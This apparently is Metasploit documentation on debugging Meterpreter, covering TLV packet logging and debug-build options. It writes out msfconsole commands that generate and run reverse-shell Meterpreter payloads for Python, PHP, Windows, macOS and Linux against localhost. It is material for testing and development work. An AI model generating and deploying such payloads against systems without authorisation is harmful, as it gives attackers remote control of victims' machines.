There are currently two main ways to debug Meterpreter sessions:

1. Log all networking requests between msfconsole and Meterpreter, i.e. TLV Packets
2. Generate a custom Meterpreter debug build with extra logging present

## Log Meterpreter TLV Packets

This can be enabled for any Meterpreter session, and does not require a debug Metasploit build:

```msf
msf6 > setg SessionTlvLogging true
SessionTlvLogging => true
```

Allowed values:

- `setg SessionTlvLogging true` - Enable network logging, defaulting to console
- `setg SessionTlvLogging false` - Disable all network logging
- `setg SessionTlvLogging console` - Log to the current msfconsole instance
- `setg SessionTlvLogging file:/tmp/session.txt` - Write the network traffic logs to an arbitrary file

Example output:

```
meterpreter > getenv USER

SEND: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
  #<Rex::Post::Meterpreter::Tlv type=COMMAND_ID      meta=INT        value=1052 command=stdapi_sys_config_getenv>
  #<Rex::Post::Meterpreter::Tlv type=REQUEST_ID      meta=STRING     value="73717259684850511890564936718272">
  #<Rex::Post::Meterpreter::Tlv type=ENV_VARIABLE    meta=STRING     value="USER">
]>

RECV: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="Q\xE63_onC\x9E\xD71\xDE3\xB5Q\xE24">
  #<Rex::Post::Meterpreter::Tlv type=COMMAND_ID      meta=INT        value=1052 command=stdapi_sys_config_getenv>
  #<Rex::Post::Meterpreter::Tlv type=REQUEST_ID      meta=STRING     value="73717259684850511890564936718272">
  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
  #<Rex::Post::Meterpreter::GroupTlv type=ENV_GROUP       tlvs=[
    #<Rex::Post::Meterpreter::Tlv type=ENV_VARIABLE    meta=STRING     value="USER">
    #<Rex::Post::Meterpreter::Tlv type=ENV_VALUE       meta=STRING     value="demo_user">
  ]>
]>

Environment Variables
=====================

Variable  Value
--------  -----
USER      demo_user
```

## Meterpreter debug builds

The following options can be specified when generating Meterpreter payloads:

- `MeterpreterDebugBuild` - When set to `true`, the generated Meterpreter payload will have additional logging present
- `MeterpreterDebugLogging` - Configure the logging mode. This currently only allows writing to a file on the remote host. Requires `MeterpreterDebugBuild` to be set to true. Example value: `setg MeterpreterDebugLogging rpath:/tmp/meterpreter_log.txt`
- `MeterpreterTryToFork` - When set to `true` the Meterpreter payload will try to fork from the currently running process. Setting to `false` is useful to see any `stdout` logging that occurs

The debug build will have additional log statements, which can be easily detected. These debug builds are useful for scenarios where A/V is not running, in local labs for learning purposes, or raising Metasploit issue reports etc.

### Python

```
use payload/python/meterpreter_reverse_tcp
generate -o shell.py -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true MeterpreterTryToFork=false
to_handler

python3 shell.py
```

### PHP

```
use payload/php/meterpreter_reverse_http
generate -o shell.php -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true
to_handler

php shell_http.php
```

### Windows

```
use windows/x64/meterpreter_reverse_tcp
generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/Windows/Temp/foo.txt'

to_handler
```

### Mac

```
use osx/x64/meterpreter_reverse_tcp
generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
```

### Linux

```
use linux/x64/meterpreter_reverse_tcp
generate -f elf -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
```

### Java

Functionality not supported
